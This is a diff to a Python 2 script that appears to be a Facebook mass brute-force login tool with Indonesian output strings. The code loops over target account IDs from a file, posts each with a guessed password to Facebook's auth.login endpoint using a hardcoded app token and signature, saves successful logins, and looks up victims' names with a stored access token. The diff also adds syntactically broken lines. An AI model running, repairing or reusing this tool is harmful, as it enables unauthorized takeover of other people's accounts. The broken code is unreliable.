@@ -201,21 +201,17 @@ def mbf():
         except KeyboardInterrupt:
             print
             print d+ " Keluar Dari Program"
-            sys.exit()
+             sys.exit()
             
 def iqbaldevmbf():
     
-    global count, dados, gagal, oradadi, baris
+    global count, dadi, gagal, oradadi, baris,
     
     try:
         data_lis = open('id.txt', "r")
         baris = data_lis.read().split()
         while listID:
-            token = open("token.txt", "r").read()
             user = listID.readline().strip()
-            iqbal = requests.get("https://graph.facebook.com/" + user + "?access_token=" + token)
-            ival = json.loads(iqbal.text)
-            nama_target = ival["name"]
             url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
             Iq_data = urllib.urlopen(url)
             jsl = json.load(Iq_data)
@@ -223,7 +219,8 @@ def iqbaldevmbf():
                 break
                 
             elif "access_token" in jsl:
-                dados.append(h+" [OK] " + pu + user + " | " + a + nama)
+                dadi = open("sukses.txt", "w").writeline().
+                dadi.close()
                 count += 1
                 
            
@@ -247,8 +244,13 @@ def iqbaldevmbf():
 def sel():
     print 
     print 
-    for ipal in dados:
-        print ipal
+    token = open("token.txt", "r").read()
+    buka = open("sukses.txt", "r").read()
+    for ibal in buka:
+        dev = requests.get("https://graph.facebook.com/" + buka + "?access_token=" + token)
+        jsl = json.loads(dev.text)
+        nama = jsl["name"]
+        print h+" [OK] " + pu + ibal + " | " + a + nama
     for ival in gagal:
         print ival
     print
